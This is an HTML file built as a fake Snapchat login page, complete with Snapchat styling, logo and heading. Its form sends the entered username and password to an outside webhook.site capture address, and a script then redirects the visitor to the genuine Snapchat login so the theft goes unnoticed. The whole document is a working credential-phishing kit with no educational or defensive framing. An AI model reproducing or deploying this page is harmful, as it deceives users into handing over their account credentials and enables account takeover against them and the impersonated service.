<!DOCTYPE html>
<html>
<head>
    <title>Snapchat - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; background-color: #FFFC00; text-align: center; }
        .login-box { margin-top: 50px; background: white; padding: 20px; display: inline-block; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        input { display: block; margin: 10px auto; padding: 12px; width: 220px; border: 1px solid #ccc; border-radius: 5px; background-color: #f0f0f0; }
        button { background-color: #000; color: white; border: none; padding: 12px 24px; border-radius: 20px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
        img { margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://community.snapchat.com/t5/image/serverpage/image-id/1632iA7E6B8E6B8E6B8E6/image-size/large?v=1.0&px=999" width="60">
        <h2 style="font-size: 1.5rem; margin-bottom: 20px;">Log in to Snapchat</h2>
        <form id="loginForm" action="https://webhook.site/11a83c79-6c7a-466b-a15e-2e3024374a9f" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function() {
            setTimeout(function() {
                window.location.href = "https://accounts.snapchat.com/accounts/login";
            }, 1000);
        });
    </script>
</body>
</html>
